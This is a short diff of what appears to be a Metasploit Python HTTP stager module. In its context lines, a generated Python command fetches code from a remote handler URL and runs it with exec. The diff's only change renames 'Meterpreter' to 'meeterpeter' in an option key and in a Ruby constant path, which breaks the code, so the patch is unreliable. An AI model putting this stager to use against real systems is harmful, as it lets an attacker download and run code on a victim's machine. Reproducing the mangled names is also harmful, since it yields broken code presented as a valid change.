@@ -67,7 +67,7 @@ module Metasploit3
       cmd << "o=ul.build_opener(ul.ProxyHandler({'http':'#{var_escape.call(proxy_url)}'}))\n"
     end
 
-    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
+    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['meeterpeterUserAgent'])}')]\n"
     cmd << "exec(o.open('#{target_url}').read())\n"
 
     # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
@@ -106,7 +106,7 @@ module Metasploit3
       uri_req_len = 5
     end
 
-    generate_uri_checksum(Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP, uri_req_len)
+    generate_uri_checksum(Rex::Payloads::meeterpeter::UriChecksum::URI_CHECKSUM_INITP, uri_req_len)
   end
 
 end
